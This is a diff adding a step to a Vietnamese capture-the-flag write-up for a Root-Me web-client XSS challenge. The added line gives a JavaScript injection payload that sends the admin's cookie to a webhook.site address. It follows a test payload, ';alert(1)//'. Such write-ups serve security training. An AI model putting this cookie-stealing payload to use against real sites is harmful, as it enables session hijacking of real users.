@@ -135,5 +135,5 @@ Truy cập link http://challenge01.root-me.org/web-client/ch32/
 Thử kiểm tra XSS ở ô này bằng payload `';alert(1)//` thì thấy thành công:
 
 ![image](https://github.com/aQ05/Write-up/assets/121664384/59eb4aa4-52e2-46c2-afb2-2d29e91bb1ea)
-
+Sau đó thì sử dụng document.location để đánh cắp cookie của admin: `'; document.location="https://webhook.site/aa5efb2d-0612-4b77-96cc-79606f6bc8aa?".concat(document.cookie);//`
 ## Flag
